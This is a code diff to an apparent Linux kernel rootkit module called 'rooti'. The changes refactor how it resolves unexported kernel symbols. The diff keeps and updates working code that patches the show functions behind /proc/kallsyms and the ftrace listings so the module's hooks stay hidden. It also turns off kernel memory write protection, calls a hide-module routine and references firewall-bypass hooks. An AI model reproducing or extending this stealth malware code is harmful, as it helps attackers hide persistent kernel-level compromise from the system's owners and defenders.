@@ -425,7 +425,8 @@ static int hook_ftrace_seq_show(struct seq_file *m, void *v)
         }
     }
 
-    if (iter->flags & FTRACE_ITER_TOUCHED && rec->ip == (unsigned long)__kallsyms_lookup_name) {
+    if (iter->flags & FTRACE_ITER_TOUCHED &&
+        rec->ip == (unsigned long)rooti_sym_repo.kallsyms_lookup_name) {
         return 0;
     }
 
@@ -470,10 +471,9 @@ static int __init rooti_init(void)
     }
     proc_inode = path.dentry->d_inode;
 
-    err = rooti_resolve_kln_addr();
+    err = rooti_resolve_unexported_syms();
     if (err) {
-        ROOTI_DEBUG("rooti_resolve_kln_addr() failed: %d", err);
-        return err;
+        ROOTI_DEBUG("rooti_resolve_unexported_syms failed: %d", err);
     }
 
     err = rooti_install_func_hooks(rooti_func_hooks, ARRAY_SIZE(rooti_func_hooks));
@@ -489,21 +489,14 @@ static int __init rooti_init(void)
     }
 
 #ifndef ROOTI_DEBUG_SHOWME
-    err = rooti_hideme();
-    if (err) {
-        ROOTI_DEBUG("rooti_hideme() failed: %d", err);
-        goto error_hideme;
-    }
+    rooti_hideme();
 
-    ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, kallsyms_op, -ENOENT);
-    ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, show_ftrace_seq_ops, -ENOENT);
-
-    orig_kallsyms_seq_show = __kallsyms_op->show;
-    orig_ftrace_seq_show = __show_ftrace_seq_ops->show;
+    orig_kallsyms_seq_show = rooti_sym_repo.kallsyms_op->show;
+    orig_ftrace_seq_show = rooti_sym_repo.show_ftrace_seq_ops->show;
 
     rooti_unprotect_memory();
-    __kallsyms_op->show = hook_kallsyms_seq_show;
-    __show_ftrace_seq_ops->show = hook_ftrace_seq_show;
+    rooti_sym_repo.kallsyms_op->show = hook_kallsyms_seq_show;
+    rooti_sym_repo.show_ftrace_seq_ops->show = hook_ftrace_seq_show;
     rooti_protect_memory();
 #endif
 
@@ -511,10 +504,6 @@ static int __init rooti_init(void)
 
     return 0;
 
-#ifndef ROOTI_DEBUG_SHOWME
-error_hideme:
-    rooti_uninstall_fw_bypass_hooks();
-#endif
 error_install_fw_hooks:
     rooti_uninstall_func_hooks(rooti_func_hooks, ARRAY_SIZE(rooti_func_hooks));
 error_install_func_hooks:
@@ -524,12 +513,9 @@ error_install_func_hooks:
 static void __exit rooti_exit(void)
 {
 #ifndef ROOTI_DEBUG_SHOWME
-    ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, kallsyms_op, );
-    ROOTI_RESOLVE_SYM_ADDR(struct seq_operations *, show_ftrace_seq_ops, );
-
     rooti_unprotect_memory();
-    __kallsyms_op->show = orig_kallsyms_seq_show;
-    __show_ftrace_seq_ops->show = orig_ftrace_seq_show;
+    rooti_sym_repo.kallsyms_op->show = orig_kallsyms_seq_show;
+    rooti_sym_repo.show_ftrace_seq_ops->show = orig_ftrace_seq_show;
     rooti_protect_memory();
 #endif
 
